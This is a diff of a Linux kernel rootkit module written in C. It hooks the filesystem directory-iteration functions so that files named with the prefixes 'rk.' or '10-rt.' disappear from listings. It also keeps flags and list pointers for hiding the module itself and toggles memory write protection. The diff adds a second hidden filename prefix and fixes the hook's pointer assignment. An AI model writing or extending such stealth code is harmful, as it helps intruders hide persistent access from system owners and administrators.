@@ -2,13 +2,12 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 
-#include <linux/sched.h>
 #include <linux/cred.h>
+#include <linux/sched.h>
+
 #include <linux/fs.h>
 #include <linux/proc_fs.h>
 #include <linux/uaccess.h>
-
-#define MAX_PIDS 50
 
 char name[] = "";
 
@@ -17,10 +16,10 @@ static filldir_t fs_filldir_orig;
 static int (*fs_iterate_orig)(struct file *, struct dir_context *);
 
 static int size, temp;
+static int hide_files = 0;
+static int hide_module = 0;
 
 static char module_status[1024];
-static char hide_files = 0;
-static char hide_module = 0;
 
 static struct list_head *module_previous;
 static struct list_head *module_kobj_previous;
@@ -56,9 +55,9 @@ static void set_addr_ro(void *addr)
 }
 
 static int fs_filldir_new(void *buf, const char *name, int namelen,
-    loff_t offset, ino_t ino, unsigned d_type)
+    loff_t offset, u64 ino, unsigned d_type)
 {
-    if(hide_files && (!strncmp(name, "rk.", 3)))
+    if(hide_files && (!strncmp(name, "rk.", 3) || !strncmp(name, "10-rt.", 6)))
         return 0;
 
     return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
@@ -67,7 +66,7 @@ static int fs_filldir_new(void *buf, const char *name, int namelen,
 static int fs_iterate_new(struct file *filp, struct dir_context *ctx)
 {
     fs_filldir_orig = ctx->actor;
-    *((filldir_t*)&ctx->actor) = *((filldir_t*)&fs_filldir_new);
+    *((filldir_t *)&ctx->actor) = &fs_filldir_new;
 
     return fs_iterate_orig(filp, ctx);
 }
